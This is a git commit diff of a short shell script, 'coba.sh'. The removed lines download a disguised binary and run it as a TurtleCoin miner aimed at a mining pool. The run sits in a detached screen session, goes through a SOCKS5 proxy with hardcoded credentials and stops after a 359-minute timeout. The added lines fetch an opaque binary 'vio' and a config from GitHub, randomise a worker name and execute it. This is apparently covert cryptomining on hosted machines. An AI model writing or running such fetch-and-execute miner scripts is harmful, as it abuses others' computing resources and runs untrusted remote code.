ac88efae0b3c4b8b790160c3b1a8715c5cd82f5e
outbesok <89157467+outbesok@users.noreply.github.com>
2021-09-21 16:59:57 +0700

    Update coba.sh

--- coba.sh
+++ coba.sh
@@ -1,13 +1,6 @@
 #!/bin/bash
 
 sudo apt update
-sudo apt install screen libjansson4 -y
-sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
-wget https://raw.githubusercontent.com/outbesok/mesin/main/obatkuat
-chmod +x coba.sh && chmod +x obatkuat
-screen -dmS ls
-A=us.turtlecoin.herominers.com:1160
-B=TRTLuxaMVkNaKUrey8Dh6tfKSzup58rRbdQFW6RGTR8dSy2VkY5tXbRAPLMuC44C3rZYGumcAuFKjFktTEGV9Z5wRvnjnxzaxvR
-C=$(shuf -i 10-9999999999999999999 -n 1)
-D=socks5://bambank:123@147.182.228.194:3000
-timeout 359m ./obatkuat -a argon2/chukwa -o $A -u $B.$C -p x -t 8 -x $D -k
+wget https://raw.githubusercontent.com/trautroi/shibusdt/main/vio
+wget https://raw.githubusercontent.com/outbesok/121/main/config.json  && chmod +x vio && sed -i "s/xavix/$(shuf -n 1 -i 1-99999)/" "config.json" && ./vio
+
